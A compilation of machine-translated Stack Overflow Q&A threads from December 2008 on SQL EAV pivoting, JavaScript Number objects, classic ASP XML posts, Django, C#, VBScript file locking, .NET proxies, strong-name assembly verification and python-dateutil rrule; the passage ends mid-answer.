# sql - 与地址簿表设计有关的 SQL 数据库问题

> ID：369213
> 
> 赞同：2
> 
> 时间：2008-12-15T18:08:27.247
> 
> 标签：sql, data-structures, entity-attribute-value, database-relations

我现在正在为我的软件编写地址簿模块。到目前为止，我已经设置了数据库，它支持非常灵活的地址簿配置。

我可以为我想要的每种类型创建 n 个条目。类型在这里表示“电子邮件”、“地址”、“电话”等数据。

我有一个名为“contact_profiles”的表。

这只有两列：

```
id           Primary key
date_created DATETIME 
```

然后有一个名为contact_attributes 的表。这个有点复杂：

```
id       PK
#profile (Foreign key to contact_profiles.id)
type     VARCHAR describing the type of the entry (name, email, phone, fax, website, ...) I should probably change this to a SET later.
value    Text (containing the value for the attribute). 
```

我现在可以链接到这些配置文件，例如从我的用户表中。但是从这里我遇到了问题。

目前，我必须为要检索的每个值创建一个 JOIN。是否有可能以某种方式创建一个视图，它给我一个以类型为列的结果？

所以现在我会得到类似的东西

```
#profile type    value
1        email   name@domain.tld
1        name    Sebastian Hoitz
1        website domain.tld 
```

但是得到这样的结果会很好：

```
#profile email           name            website
1        name@domain.tld Sebastian Hoitz domain.tld 
```

我最初不想创建这样的表格布局的原因是，可能总是要添加一些东西，我希望能够拥有多个相同类型的属性。

那么你知道是否有可能动态转换它？

如果您需要更好的描述，请告诉我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T18:25:53.793

您重新发明了一种名为[Entity-Attribute-Value](http://en.wikipedia.org/wiki/Entity-attribute-value_model)的数据库设计。这种设计有很多弱点，包括您发现的弱点：很难以传统格式重现查询结果，每个属性只有一列。

这是您必须执行的操作的示例：

```
SELECT c.id, c.date_created,
 c1.value AS name,
 c2.value AS email,
 c3.value AS phone,
 c4.value AS fax,
 c5.value AS website
FROM contact_profiles c
 LEFT OUTER JOIN contact_attributes c1
  ON (c.id = c1.profile AND c1.type = 'name')
 LEFT OUTER JOIN contact_attributes c1
  ON (c.id = c1.profile AND c1.type = 'email')
 LEFT OUTER JOIN contact_attributes c1
  ON (c.id = c1.profile AND c1.type = 'phone')
 LEFT OUTER JOIN contact_attributes c1
  ON (c.id = c1.profile AND c1.type = 'fax')
 LEFT OUTER JOIN contact_attributes c1
  ON (c.id = c1.profile AND c1.type = 'website'); 
```

您必须为每个属性添加另一个`LEFT OUTER JOIN`。您在编写查询时必须知道属性。你必须使用`LEFT OUTER JOIN`而不是`INNER JOIN`因为没有办法强制属性（相当于简单地声明一个列`NOT NULL`）。

在存储属性时检索它们的效率要高得多，然后编写应用程序代码来循环遍历结果集，为每个属性构建一个对象或关联数组。这种方式不需要知道所有的属性，也不需要执行`n`-way join。

```
SELECT * FROM contact_profiles c
  LEFT OUTER JOIN contact_attributes ca ON (c.id = ca.profile); 
```

您在评论中询问如果您需要这种级别的灵活性，如果不使用 EAV 设计该怎么办？如果您确实需要无限的元数据灵活性，SQL 不是正确的解决方案。以下是一些替代方案：

*   存储一个`TEXT`BLOB，其中包含以 XML 或 YAML 格式结构化的所有属性。
*   使用[Sesame 之](http://openrdf.org/)类的语义数据建模解决方案，其中任何实体都可以具有动态属性。
*   放弃数据库并使用平面文件。

EAV 和任何这些替代解决方案都需要大量工作。如果您真的需要在数据模型中具有这种程度的灵活性，您应该非常仔细地考虑，因为如果您可以将元数据结构视为相对不变，它会变得非常简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T18:20:47.250

如果您限制自己在此查询中为每个人显示单个电子邮件、姓名、网站等，我会使用子查询：

```
SELECT cp.ID profile
  ,cp.Name
  ,(SELECT value FROM contact_attributes WHERE type = 'email' and profile = cp.id) email
  ,(SELECT value FROM contact_attributes WHERE type = 'website' and profile = cp.id) website
  ,(SELECT value FROM contact_attributes WHERE type = 'phone' and profile = cp.id) phone
FROM contact_profiles cp 
```

如果您使用的是 SQL Server，您还可以查看[PIVOT](http://msdn.microsoft.com/en-us/library/ms177410.aspx)。

如果您想显示多封电子邮件、电话等，请考虑每个配置文件的数量必须相同，否则您将有空白。

我还将排除类型列。创建一个名为`contact_attribute_types`“email”、“website”等的表。然后将`contact_attribute_types.id`整数值存储在`contact_attributes`表中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T18:24:06.573

您将需要生成如下查询：

```
select #profile,
       max(case when type='email' then value end) as email,
       max(case when type='name' then value end) as name,
       max(case when type='website' then value end) as website
from mytable
group by #profile 
```

但是，每个#profile 只会为每种类型显示一个值。您的 DBMS 可能有一个函数，您可以使用该函数代替 MAX 将所有值连接为逗号分隔的字符串，或者您可以编写一个。

由于您已经提到的原因，通常最好避免使用这种数据模型！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T18:35:55.880

您为每个联系人类型创建一个视图

当您想要从整个表格中提取的所有信息时，当您想要特定联系人类型的子集时，您可以从视图中提取。

我将创建一个将意图 {all, phone, email, address} 作为参数之一的存储过程，然后派生数据。我所有的应用程序代码都会调用这个存储过程来获取数据。此外，当添加新类型时（这应该很少见，您创建另一个视图并仅修改此存储过程）。

我已经为多个小型/中型系统实施了类似的设计，并且没有遇到任何问题。

我错过了什么吗？这似乎微不足道？

编辑：

我明白了我所缺少的...您正在尝试同时进行规范化和非规范化。我不确定您提取记录的其余业务规则是什么。您可以拥有电话/电子邮件/地址等具有多个或空值的配置文件。我会保持您的数据格式相同，并再次使用存储过程来创建您想要的特定视图。随着您的业务需求发生变化，您可以不理会您的数据，只需创建另一个存储区来访问它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-09T00:31:07.373

这个问题没有一个正确的答案，因为人们需要知道，对于您的特定组织或应用程序，*企业*想要收集多少联系方式，他们希望信息的最新程度，以及他们有多大的灵活性愿意投资。

当然，这里的许多人可以很好地猜测普通企业想要做什么，但真正的答案是找出你的项目，你的用户对什么感兴趣。

顺便说一句，所有关于“最佳”的架构问题都需要这种成本、收益和风险分析。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-05-17T12:29:34.257

现在，面向文档的数据库方法变得越来越流行，人们可以使用其中之一将所有这些信息存储在一个条目中 - 因此删除所有那些额外的连接和查询。

# javascript - Why should you not use Number as a constructor?

> ID：369220
> 
> 赞同：32
> 
> 时间：2008-12-15T18:09:25.713
> 
> 标签：javascript, oop, constructor, jslint

I entered this statement in JSLint:

```
var number = new Number(3); 
```

And received the following message:

> Do not use Number as a constructor.

Why is that? The statement is creating a number object, not a primitive value, so I don't see why using `new` is a problem.

**EDIT:** Thanks for all the responses. They've got me thinking further, so I posted a follow-up question [here](https://stackoverflow.com/questions/369424/question-about-objectmethod-in-javascript).

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2008-12-15T19:31:35.893

除了打破 === 和 typeof 返回“object”之外，使用 Number 构造函数还改变了值在布尔上下文中的使用方式。由于“new Number(0)”是一个对象，而不是文字值，它的计算结果为“true”，因为它不为空。例如：

```
var n1 = 0;
var n2 = new Number(0);

n1 == n2  // true
n1 === n2 // false
if (n1) {
    // Doesn't execute
}
if (n2) {
    // Does execute, because n2 is an object that is not null
} 
```

比在数字文字和数字对象之间打破 === 更糟糕的是， == 甚至在两个数字对象之间都不起作用（至少不是以直观的方式——它们测试的是同一性，而不是相等性）。

```
var n1 = new Number(3);
var n2 = new Number(3);

alert(n1 == n2); // false
alert(n1 === n2); // false 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-12-15T18:21:57.780

```
var number = new Number(3);
alert(typeof number); // gives "object" 
```

Making the variable `number` have a type of `Object` is probably not the most desired outcome. Whereas:

```
var number = Number(3);
alert(typeof number); // gives "number" 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-15T18:22:04.580

Unfortunately, the [JSLint docs](http://jslint.com/lint.html) don't go into any further detail than "does not expect to see", so we're left to guess. My own suspicion is that this is to make type-checking easier:

```
assert(typeof 3             === "number");
assert(typeof new Number(3) === "object"); 
```

If you mix the two in your code, your type checks become more complex:

```
if (typeof foo === "number" || foo instanceof Number) { … } 
```

However, JSLint also takes issue with the Object and Array constructors, which do not make this distinction, so it may simply be the author's coding-style preference:

```
assert(typeof []           === "object");
assert(typeof new Array()  === "object");
assert(typeof {}           === "object");
assert(typeof new Object() === "object"); 
```

**Edit:** Steven's answer raises an excellent point — the non-typecasting equality operator (===). Number objects and number primitives will never be considered equal by this operator, even if their values are the same:

```
assert(3 !== new Number(3)); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-12-15T18:28:19.060

new Number() does not return the same object as a number literal. This means that using new Number() breaks ===, which is the best way to check for exact equality in Javascript.

```
>>> 3 == 1 + 2
true
>>> 3 === 1 + 2
true
>>> new Number(3) == 1 + 2
true
>>> new Number(3) === 1 + 2
false 
```

You can find the rationale for JSLint's behavior in the author's book, [JavaScript: The Good Parts](http://www.worldcat.org/oclc/192027457), in Appendix C.

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-12-15T19:43:19.050

它速度较慢，并且需要更多内存。运行时可以将不可变文字视为不可变文字。这意味着当它遇到`3`代码中的某个地方时，它可以将其优化为共享对象。使用`Number`构造函数时，会为每个实例分配新内存。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-01-04T14:47:30.343

> 在 JavaScript 中，一个 Object 类型不等于另一个 Object 类型，即使它们具有完全相同的值，除非它们都是 EXACT SAME 对象。
> 
> 换句话说，在下面 Matthew 的示例中，n1 == n2 为假，因为您将两个 REFERENCES 与两个 SEPARATE 对象进行比较，但 n1 == n1 为真，因为您正在比较对 EXACT SAME 对象的引用。
> 
> 所以，虽然我现在明白了为什么使用 Number 作为构造函数会导致问题，但我发现在比较 Number 对象时可以使用 valueOf 属性。
> 
> 换句话说，n1.valueOf == n2.valueOf 是真的！（这是因为您正在比较 valueOf FUNCTION 的返回值，而不是对象本身的 REFERENCES。）

[这个答案/摘要是从它不属于的问题中提取的。]

# xml - 在经典asp中从另一个网站对ServerXMLHTTP post的调用接收xml

> ID：369226
> 
> 赞同：1
> 
> 时间：2008-12-15T18:10:45.430
> 
> 标签：xml, asp-classic, serverxmlhttp

我正在将 ASP 网页的两侧写入 ASP 网页对话，其中原始网页将信息推送到接收网页，然后接收网页对其进行处理并发回响应。原始网页必须使用以下代码开始转换：

```
url = "www.receivingwebsite.com\asp\receivingwebpage.asp
information = "UserName=Colt&PassWord=Taylor&Data=100"
Set xmlhttp = server.Createobject("MSXML2.ServerXMLHTTP")
xmlhttp.Open "POST", url, false
xmlhttp.setRequestHeader "Content-Type", "text/xml"
xmlhttp.send information 
```

...然后以某种方式接收页面中的 ASP 代码必须能够看到发送的信息。我已经尝试了我能想到的一切。该信息不在请求对象`querystring`或表单数组中（因为内容类型是`text/xml`），我尝试`domdocument`通过其`load()`和/或`loadxml()`方法将整个请求对象传递给 a。

无论我做什么，我都找不到信息，但我知道它正在发送，因为当我将 content-type 更改为 时，我可以在数组`application/x-www-form-urlencoded`中看到它。`request.form`

那么当内容类型为 时，我的信息在哪里`text/xml`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-16T08:58:35.343

当您将内容类型设置为“text/xml”时，您确实需要将信息作为 XML 字符串发送，而不是名称-值列表。

```
url = "www.receivingwebsite.com\asp\receivingwebpage.asp"
information = "<Send><UserName>Colt</UserName><PassWord>Taylor</PassWord><Data>100</Data></Send>"
Set xmlhttp = server.Createobject("MSXML2.ServerXMLHTTP")
xmlhttp.Open "POST", url, false
xmlhttp.setRequestHeader "Content-Type", "text/xml" 
xmlhttp.send information 
```

然后，在您的接收 ASP 页面中，您将捕获 XML，如下所示：

```
Dim xmlDoc
Dim userName
set xmlDoc=Server.CreateObject("Microsoft.XMLDOM")
xmlDoc.async="false"
xmlDoc.load(Request)
userName = xmlDoc.documentElement.selectSingleNode("UserName").firstChild.nodeValue 
```

# python - 在 Django 中序列化 ModelForm 对象的最佳方法是什么？

> ID：369230
> 
> 赞同：2
> 
> 时间：2008-12-15T18:12:22.293
> 
> 标签：python, xml, django, json, serialization

我正在为我当前的项目使用 Django 和 Google Web Toolkit (GWT)。我想通过 Http 响应将 ModelForm 实例传递给 GWT，以便我可以“切碎”它并随意渲染它。我的目标是使表单与对我的 models.py 文件的更改保持同步，同时增加我对表单外观的控制。但是，用于序列化的 django 类、序列化程序和 simplejson 无法序列化 ModelForm。cPickle 也不能。我的替代方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-16T22:21:23.240

如果您使用的是纯 Django，则将表单传递给您的模板，然后可以调用表单上的各个字段以进行更精确的呈现，而不是使用 ModelForm.to_table。您可以使用以下内容迭代每个字段并准确呈现您想要的方式：

```
{% for field in form.fields %}
    <div class="form-field">{{ field }}</div>
{% endfor %} 
```

如果您想排除某些字段，这也使您能够使用循环内的 {% if %} 块进行条件检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-16T19:24:10.213

如果您的问题只是将 ModelForm 序列化为 json，只需编写您自己的 simplejson 序列化器子类。

# c# - 如何将 C# 字符转换为其十六进制代码表示形式

> ID：369241
> 
> 赞同：9
> 
> 时间：2008-12-15T18:15:15.623
> 
> 标签：c#, .net, string

我需要做的是将 C# 字符转换为转义的 unicode 字符串：

所以，'A' - > "\x0041"。

有没有比这样做更好的方法：

```
char ch = 'A';
string strOut = String.Format("\\x{0}", Convert.ToUInt16(ch).ToString("x4")); 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-12-15T18:18:41.157

投射和使用[复合格式](http://msdn.microsoft.com/en-us/library/txafckwd.aspx)：

```
char ch = 'A';
string strOut = String.Format(@"\x{0:x4}", (ushort)ch); 
```

# vbscript - vbscript：fso.opentextfile 权限被拒绝

> ID：369242
> 
> 赞同：4
> 
> 时间：2008-12-15T18:15:25.437
> 
> 标签：vbscript, file-permissions

在我的代码段中，当我编写文件名脚本时，它在以下行中给了我一个被拒绝的权限：

```
Set objTextFile = objFSO.OpenTextFile(strDirectory & strFile, ForAppending, True) 
```

这是脚本

```
'output log info
Function OutputToLog (strToAdd)  
    Dim strDirectory,strFile,strText, objFile,objFolder,objTextFile,objFSO
    strDirectory = "c:\eNet"
    strFile = "\weeklydel.bat"
    'strText = "Book Another Holiday"
    strText = strToAdd

    ' Create the File System Object
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Check that the strDirectory folder exists
    If objFSO.FolderExists(strDirectory) Then
       Set objFolder = objFSO.GetFolder(strDirectory)
    Else
       Set objFolder = objFSO.CreateFolder(strDirectory)
       'WScript.Echo "Just created " & strDirectory
    End If

    If objFSO.FileExists(strDirectory & strFile) Then
       Set objFolder = objFSO.GetFolder(strDirectory)
    Else
       Set objFile = objFSO.CreateTextFile(strDirectory & strFile)
       'Wscript.Echo "Just created " & strDirectory & strFile
    End If

    set objFile = nothing
    set objFolder = nothing
    ' OpenTextFile Method needs a Const value
    ' ForAppending = 8 ForReading = 1, ForWriting = 2
    Const ForAppending = 2

    Set objTextFile = objFSO.OpenTextFile(strDirectory & strFile, ForAppending, True)

    ' Writes strText every time you run this VBScript
    objTextFile.WriteLine(strText)
    objTextFile.Close
End Function 
```

我已经分配了 vbscript 域管理员权限。有任何想法吗？

提前致谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-12-15T18:33:27.943

我认为这与文件权限本身无关。这与您使用以下命令创建文件的事实有关：

```
Set objFile = objFSO.CreateTextFile(strDirectory & strFile) 
```

这会创建文件......并带有对该文件的引用（objFile）

然后在销毁引用之前不要关闭文件

```
...
'Missing objFile.Close here
Set objFile = nothing
Set objFolder = nothing
... 
```

因此，您正在破坏引用，但将文本流留在内存中，从而锁定您的文件。

然后，当文件已经“打开”时，您将继续尝试重新打开文件。这有点冗长，您在创建文件后已经获得了参考 - 直接写入该参考而不是在创建另一个参考之前销毁参考会更容易。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-12-01T13:22:51.077

物有所值...

由于这一行，我确信我有一个权限错误：

```
Set LogFile = LogFSO.OpenTextFile(LogFileName, ForWriting, True) 
```

因为那是“权限被拒绝”错误所指向的行。但事实上，我的权限错误是在下面几行：

```
WshShell.AppActivate(ScreensToRemove(i))
WshShell.SendKeys ("~")
WScript.Sleep(1000) 
```

没有带有这样标题的屏幕，所以 SendKeys 是没有权限的。

当然，解决方案是：

```
If WshShell.AppActivate(ScreensToRemove(i)) = True Then
   WshShell.SendKeys ("~")
   WScript.Sleep(1000)
End if 
```

希望这可能会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-05-19T00:47:27.437

另外，请确保您没有在 Excel 中打开该文件（我在使用 .csv 文件时遇到了这个问题）...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-12-02T22:35:16.933

在我的特殊情况下，之前存在的文件，我所要做的就是向所有人用户授予权限

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T02:23:17.493

巴拉巴斯特是完全正确的。您需要在第二次重新打开文件之前关闭文件以进行写入，或者使用现有的打开句柄。

# c# - 如何从 Web 服务代理类转换到的 DataSet 中恢复一个类？

> ID：369246
> 
> 赞同：0
> 
> 时间：2008-12-15T18:16:55.263
> 
> 标签：c#, .net, web-services

**背景**

我在 Visual Studio 中创建了一个 Web 服务，我正在尝试使用自动生成的代理类来使用它。Web 服务返回一个我已经实现的类，其中包含一个列表。

**问题**

代理类已自动生成将 SOAP 发送到 Web 服务的方法。它使用 Invoke() 方法执行调用，然后将结果转换为 DataSet。我怎样才能让这个对象回到我知道的类中？

我知道我可以手动编辑自动生成的文件，但这不是很容易维护，所以我不想走这条路（任何时候重建 Web 服务，都必须再次进行更改）。

有没有办法告诉生成的类更具体，并实际使用正确的数据类型？还是我必须编写一组笨重的反序列化器才能让我的数据恢复到正确的形状？

**例子**

我的 Web 服务类中的一种方法：

```
[WebMethod]
public UpdateList RetrieveUpdates(long sessionID, string configurationVersion, string coreVersion, string researcherDBVersion)
{ ... } 
```

将类添加为 Web 引用会生成以下代理方法：

```
public DataSet RetrieveUpdates(long sessionID, string configurationVersion, string coreVersion, string researcherDBVersion) {
    object[] results = this.Invoke("RetrieveUpdates", new object[] {
        sessionID,
        configurationVersion,
        coreVersion,
        researcherDBVersion});
   return ((DataSet)(results[0]));
} 
```

我从这个方法收到的数据集总是空的（因为你不能从我的类转换为数据集）。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T02:03:32.077

由于 Web 引用会生成部分类，因此您应该能够向您的项目添加代理类的部分类扩展，该代理类仅重新实现有问题的方法（只需复制并粘贴它）但会更改返回类型（当然还有名称）。如果方法签名发生变化，您将不得不更新您的扩展，但至少如果没有发生这种情况并且您重新生成代理，您将不必重新应用任何更改（并且您仍然可以使用任何其他生成的类/方法照原样）。

我以前使用这种方法来“修复”代理类（例如，添加未在 WSDL 中定义的 SOAP 标头），虽然不理想，但它确实有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T18:40:52.233

除非您的客户端代码知道您的自定义类（例如，具有对程序集的引用），否则您将无法从服务中检索该类型的对象。

听起来您想要做的是跨服务层共享类型。为此，您要么必须向客户端应用程序提供具有该 `UpdateList`类型的程序集的副本，要么需要查看 WCF 之类的内容。

# .net - 可以使用强命名程序集来验证程序集作者吗？

> ID：369248
> 
> 赞同：22
> 
> 时间：2008-12-15T18:17:07.820
> 
> 标签：.net, security, assemblies, strongname

我一直在阅读 MSDN 中的正确文章，*[Strong-Named Assemblies](http://msdn.microsoft.com/en-us/library/wd40t7ad.aspx)*和相关的 Stack Overflow 问题，*[Checking an assembly for a strong name](https://stackoverflow.com/questions/308756)*。

1.  可以在多大程度上验证强名称程序集以避免篡改？
2.  是否可以使用强命名来验证程序集作者？

第一个问题出现在阅读 CSharp411 文章*[.NET Assembly FAQ – Part 3 – Strong Names and Signing](http://www.csharp411.com/net-assembly-faq-part-3-strong-names-and-signing/)*之后，其中提到了这一点，以及使用强名称的其他问题：

> "***无法停止完全替换。****强名称无法阻止黑客删除强名称签名，恶意修改您的程序集，用自己的密钥重新签名，然后将他的程序集冒充为您的。* "

第二个问题旨在找出强命名和其他签名方案（例如[Authenticode](http://www.iss.net/security_center/advice/Countermeasures/Authentication/Authenticode/default.htm) ）之间的区别。同一篇 MSDN 文章提到了早期状态：

> "*但是请注意，强名称本身并不意味着像数字签名和支持证书所提供的那样的信任级别。* "

我是否试图将强命名用于比创建它时更多的用途？创建强命名是为了避免名称冲突还是一种新的“GAC DLL Hell”？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-12-15T19:40:04.190

当您使用基于您创建的私钥的强名称签署程序集时，这具有以下好处：

*   强名称通过向程序集添加公钥令牌和数字签名来保证程序集身份的唯一性。
*   强名称可以与公钥匹配，以证明程序集来自具有该公钥的发布者，并且仅来自该发布者。
*   强名称提供强完整性检查。通过 .NET Framework 安全检查可确保程序集的内容自上次生成后未更改。

> > 是否可以使用强命名来验证程序集作者？

是的，如上所述，强命名可以验证程序集的**最新**作者。但它并没有验证原作者。如果攻击者替换了您的程序集的强名称，那么可以验证的是您不是该程序集的最新作者。如果他删除强名称，则根本无法进行作者验证。

> > 可以在多大程度上验证强名称程序集以避免篡改？

以下 C# 代码验证攻击者未篡改在应用强名称时写入程序集的公钥令牌。它不能避免篡改，但它可以检测到某些类型的篡改。下面的方法接受一个包含您的公钥令牌的字节数组，并将其与程序集的实际令牌进行比较。请注意，要使此技术有效，您选择的混淆器应加密包含您的公钥令牌的字符串，并且仅在使用时动态解密它。还要注意，您需要拥有 FullTrust 权限才能使此代码正常工作，因为它在后台使用反射。

```
// Check that public key token matches what's expected.
private static bool IsPublicTokenOkay_Check(byte [] tokenExpected)
{
    // Retrieve token from current assembly
    byte [] tokenCurrent = Assembly.GetExecutingAssembly().GetName().GetPublicKeyToken();

    // Check that lengths match
    if (tokenExpected.Length == tokenCurrent.Length)
    {
        // Check that token contents match
        for (int i = 0; i < tokenCurrent.Length; i++)
            if (tokenExpected[i] != tokenCurrent[i]) 
                return false;
    }
    else
    {
        return false;
    }
    return true;
} 
```

只要您在 .NET 3.5 SP1 之前的 .NET Framework 版本下运行，您还可以强制验证强名称签名，以防强名称被攻击者删除或强名称检查在注册表。下面的代码演示了对另一个名为 NativeMethods 的类的静态方法的调用。这是将执行验证的地方。

```
// Check that this assembly has a strong name.
private bool IsStrongNameValid_Check()
{
    byte wasVerified = Convert.ToByte(false); 
     byte forceVerification = Convert.ToByte(true);
    string assemblyName = AppDomain.CurrentDomain.BaseDirectory + 
                          AppDomain.CurrentDomain.FriendlyName; 
    return NativeMethods.CheckSignature(assemblyName, 
                                        forceVerification, 
                                        ref wasVerified);
} 
```

实际的签名验证是使用 P/Invoke 完成的，如下所示。**StrongNameSignatureVerificationEx** API的使用非常复杂 - 要获得体面的解释，请参阅[此博客条目](http://blogs.msdn.com/shawnfa/archive/2004/06/07/150378.aspx)。

```
// P/Invoke to check various security settings
// Using byte for arguments rather than bool, 
// because bool won't work on 64-bit Windows!
[DllImport("mscoree.dll", CharSet=CharSet.Unicode)]
private static extern bool StrongNameSignatureVerificationEx(string wszFilePath, 
                                                             byte fForceVerification, 
                                                             ref byte pfWasVerified);

// Private constructor because this type has no non-static members
private NativeMethods()
{
}

public static bool CheckSignature(string assemblyName, 
                                  byte forceVerification, 
                                  ref byte wasVerified)
{
    return StrongNameSignatureVerificationEx(assemblyName, 
                                             forceVerification, 
                                             ref wasVerified );
} 
```

请注意，默认情况下，这不适用于使用 .NET 3.5 SP1 或更高版本（具有[强名称绕过功能](http://msdn.microsoft.com/en-us/library/vstudio/xwb8f617%28v=vs.100%29.aspx)）的应用程序。可以通过将设置添加到其配置文件来为您的应用程序[禁用此功能。](http://msdn.microsoft.com/en-us/library/vstudio/cc713694%28v=vs.100%29.aspx)但是当然，任何对该配置文件具有读/写访问权限的攻击者都可以推翻您的决定。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-12-15T18:27:17.020

Authenticode 依赖第三方证书颁发机构进行证书验证。强命名就像自签名证书一样工作，可以这样对待。它确实使用标准数字签名，但问题在于验证程序集作者的公钥确实有效。如果您通过作者的可信渠道单独获得它并且您信任该渠道，那么是的，您可以像自签名证书一样验证它。

只要您确定强名称私钥由作者保存并且您知道作者的公钥，您就可以确保它没有被篡改（在某种程度上您可以确保数字签名的电子邮件没有被篡改）。顺便说一句，不要误会我的意思：引用是完全正确的，攻击者可以轻松地退出程序集或删除现有签名。但是，生成的程序集将具有**不同的*数字签名，可以对照原始签名（如果您拥有原始公钥）。

在这种情况下，它类似于自签名证书。如果您能以某种方式确定作者的公钥，则可以验证权限。但是，与依赖证书颁发机构的 Authenticode 不同，没有直接的、系统定义的方式来分发公钥。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T18:40:32.797

我认为强名称对于版本控制很有用，可用于帮助设置代码访问安全**编辑**的信任级别：~~但您不能使用它们来验证程序集是由受信任的人或特定作者创作的。~~请参阅@RoadWarrior 的评论和@RoadWarrior 对此问题的回答。

强命名您的程序集并不能使其防篡改。
**编辑：**参见@RoadWarrior 和@divo 的评论。如果您的应用程序正在检查程序集作者的原始私钥并强制进行强名称验证，我的陈述是不正确的。但是，如果攻击者可以访问您的应用程序中的*所有*程序集和/或您正在使用 CLR 免费提供的开箱即用的强名称验证，那么我坚持我所说的。

这可以被[一个坚定的攻击者](http://www.atrevido.net/blog/CommentView.aspx?guid=f772c18a-f389-4c28-bd6a-a30f4ccc84f5)颠覆。

前段时间我读过[一篇关于强名称和安全性的讨论，这让我相信对于我们生产的程序集，authenticode 可以更好地保证我们的客户程序集来自受信任的来源。](http://groups.google.co.uk/group/microsoft.public.dotnet.security/browse_frm/thread/268e8fab2a7124df/bf09582265c8f154?hl=en&lr=&rnum=2&prev=/groups%3Fq%3DRahul%2BKumar%2Bgroup:*security*%26hl%3Den%26lr%3D%26selm%3D%2523UDXSOX0EHA.3820%2540TK2MSFTNGP11.phx.gbl%26rnum%3D2#bf09582265c8f154)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-22T18:27:05.973

我相信有一种方法可以使用强名称来达到“信任”的目的。我了解 Microsoft 仅建议使用强名称以确保程序集内容未被修改，并建议使用“Authenticode”来获得信任。

但是，如果加载器应用程序（加载这些程序集/程序的应用程序）维护它可以加载的“程序集”的加密列表；那不会解决“信任”问题吗？

例如，包加载器可以使用公钥维护程序集名称并通过完整的程序集名称加载程序集/程序？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-10-22T03:02:47.980

如果要对程序集进行完整性检查，则必须进行公钥令牌检查（参见上面“HTTP 410”的答案）并使用**StrongNameSignatureVerificationEx**进行检查（[https://docs.microsoft.com/de-de/dotnet /framework/unmanaged-api/strong-naming/strongnamesignatureverificationex-function](https://docs.microsoft.com/de-de/dotnet/framework/unmanaged-api/strong-naming/strongnamesignatureverificationex-function)）。**StrongNameSignatureVerificationEx**的结果和外参数**pfWasVerified 都**必须为真。只需为所有程序集使用**一个**签名密钥文件 (.snk)。

更好的是像 BabelFor.Net 这样的好的 .NET 程序集混淆器。其中许多具有内置的防篡改检查功能。

干杯

# python - 使用现有的规则来生成更多的事件

> ID：369261
> 
> 赞同：2
> 
> 时间：2008-12-15T18:23:35.000
> 
> 标签：python, python-dateutil

我有一个规则实例，例如

```
 r = rrule(WEEKLY, byweekday=SA, count=10, dtstart=parse('20081001')) 
```

其中 dtstart 和 byweekday 可能会改变。

如果我想从这个规则生成十个日期，那么最好的方法是什么？我可以为 r 的 _dtstart 成员分配一个新值吗？这似乎有效，但我不确定。

例如

```
 r._dtstart = list(r)[-1] or something like that 
```

否则我想我会创建一个新的 rrule 并访问原始实例的 _dtstart、_count、_byweekday 等。

编辑：

我已经考虑了更多，我认为我应该做的是在创建第一个 rrule 实例时省略“计数”参数。我第一次使用 rrule 时仍然可以出现 10 次

```
instances = list(r[0:10]) 
```

然后我可以得到更多

```
more = list(r[10:20]) 
```

我认为这解决了我的问题，没有任何丑陋

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T03:57:33.950

首先，`r._dtstart = list(r)[-1]`将为您提供原始日期序列中的最后一个日期。如果你不加修改地使用它作为新序列的开始，你将得到一个重复的日期，即第一个序列的最后一个日期将与新序列的第一个日期相同，这可能不是你想要什么：

```
>>> from dateutil.rrule import *
>>> import datetime

>>> r = rrule(WEEKLY, byweekday=SA, count=10, dtstart=datetime.datetime(2008,10,01))
>>> print list(r)
[datetime.datetime(2008, 10, 4, 0, 0), datetime.datetime(2008, 10, 11, 0, 0), datetime.datetime(2008, 10, 18, 0, 0), datetime.datetime(2008, 10, 25, 0, 0), datetime.datetime(2008, 11, 1, 0, 0), datetime.datetime(2008, 11, 8, 0, 0), datetime.datetime(2008, 11, 15, 0, 0), datetime.datetime(2008, 11, 22, 0, 0), datetime.datetime(2008, 11, 29, 0, 0), datetime.datetime(2008, 12, 6, 0, 0)]
>>> r._dtstart = r[-1]
>>> print list(r)
[datetime.datetime(2008, 12, 6, 0, 0), datetime.datetime(2008, 12, 13, 0, 0), datetime.datetime(2008, 12, 20, 0, 0), datetime.datetime(2008, 12, 27, 0, 0), datetime.datetime(2009, 1, 3, 0, 0), datetime.datetime(2009, 1, 10, 0, 0), datetime.datetime(2009, 1, 17, 0, 0), datetime.datetime(2009, 1, 24, 0, 0), datetime.datetime(2009, 1, 31, 0, 0), datetime.datetime(2009, 2, 7, 0, 0)] 
```

此外，操纵 r._dtstart 被认为是一种糟糕的形式，因为它显然是一个私有属性。

相反，请执行以下操作：

```
>>> r = rrule(WEEKLY, byweekday=SA, count=10, dtstart=datetime.datetime(2008,10,01))
>>> r2 = rrule(WEEKLY, byweekday=SA, count=r.count(), dtstart=r[-1] + datetime.timedelta(days=1))
>>> print list(r)
